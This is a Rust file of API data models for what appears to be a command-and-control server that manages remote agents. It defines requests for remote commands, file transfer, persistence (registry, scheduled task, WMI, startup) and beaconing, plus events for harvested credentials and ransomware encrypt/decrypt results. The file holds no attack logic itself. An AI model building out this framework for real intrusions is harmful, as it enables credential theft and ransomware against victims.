//! API Data Models
//!
//! These models are used for JSON serialization/deserialization
//! in the team client API.

use serde::{Deserialize, Serialize};

/// Agent information returned by the API
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentInfo {
    pub id: u64,
    pub addr: String,
    pub hostname: Option<String>,
    pub username: Option<String>,
    pub os_version: Option<String>,
    pub privileges: Option<String>,
    pub connected_at: String,
    pub cwd: Option<String>, // Current working directory
}

/// List of agents response
#[derive(Debug, Serialize, Deserialize)]
pub struct AgentListResponse {
    pub agents: Vec<AgentInfo>,
    pub total: usize,
}

/// Command request payload
#[derive(Debug, Deserialize)]
pub struct CommandRequest {
    pub command: String,
}

/// Command response
#[derive(Debug, Serialize)]
pub struct CommandResponse {
    pub success: bool,
    pub message: String,
    pub agent_id: u64,
}

/// Download request payload
#[derive(Debug, Deserialize)]
pub struct DownloadRequest {
    pub remote_path: String,
}

/// Upload request payload
#[derive(Debug, Deserialize)]
pub struct UploadRequest {
    pub local_data_base64: String,
    pub remote_path: String,
}

/// Persistence request payload
#[derive(Debug, Deserialize)]
pub struct PersistenceRequest {
    pub method: String, // registry, task, wmi, startup
}

/// Beacon configuration request
#[derive(Debug, Deserialize)]
pub struct BeaconRequest {
    pub interval: u32,
    pub jitter: u32,
}

/// List directory request
#[derive(Debug, Deserialize)]
pub struct ListDirRequest {
    pub path: String,
}

/// Delete request payload
#[derive(Debug, Deserialize)]
pub struct DeleteRequest {
    pub path: String,
}

/// Change directory request
#[derive(Debug, Deserialize)]
pub struct CdRequest {
    pub path: String,
}

/// Directory entry info
#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct DirEntry {
    pub name: String,
    pub is_dir: bool,
    pub size: u64,
}

/// List directory response
#[derive(Debug, Serialize)]
pub struct ListDirResponse {
    pub path: String,
    pub entries: Vec<DirEntry>,
}

/// Login request
#[derive(Debug, Deserialize)]
pub struct LoginRequest {
    pub username: String,
    pub password: String,
}

/// Login response
#[derive(Debug, Serialize)]
pub struct LoginResponse {
    pub success: bool,
    pub token: Option<String>,
    pub message: String,
}

/// Server status response
#[derive(Debug, Serialize)]
pub struct ServerStatus {
    pub status: String,
    pub version: String,
    pub uptime_seconds: u64,
    pub connected_agents: usize,
    pub tls_enabled: bool,
}

/// Generic API response
#[derive(Debug, Serialize)]
pub struct ApiResponse<T: Serialize> {
    pub success: bool,
    pub data: Option<T>,
    pub error: Option<String>,
}

impl<T: Serialize> ApiResponse<T> {
    pub fn success(data: T) -> Self {
        Self {
            success: true,
            data: Some(data),
            error: None,
        }
    }

    pub fn error(message: String) -> ApiResponse<()> {
        ApiResponse {
            success: false,
            data: None,
            error: Some(message),
        }
    }
}

/// WebSocket event types sent to team clients
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", content = "data")]
pub enum ServerEvent {
    /// New agent connected
    AgentConnected(AgentInfo),
    /// Agent disconnected
    AgentDisconnected { id: u64 },
    /// Agent info updated (sysinfo received)
    AgentUpdated(AgentInfo),
    /// Command output received from agent
    CommandOutput {
        agent_id: u64,
        output: String,
        is_error: bool,
    },
    /// Directory listing received from agent
    DirectoryListing {
        agent_id: u64,
        path: String,
        entries: Vec<DirEntry>,
    },
    /// Current working directory changed
    CwdChanged { agent_id: u64, cwd: String },
    /// File download completed
    FileDownloaded {
        agent_id: u64,
        filename: String,
        size: usize,
        save_path: String,
    },
    /// File or directory deleted
    FileDeleted {
        agent_id: u64,
        path: String,
    },
    /// Credentials harvested
    CredentialsHarvested {
        agent_id: u64,
        count: usize,
        save_path: String,
    },
    /// Ransomware operation result
    RansomwareResult {
        agent_id: u64,
        operation: String, // encrypt or decrypt
        result: String,
        key: Option<String>,
    },
    /// Server error/info message
    ServerMessage {
        level: String, // info, warning, error
        message: String,
    },
}
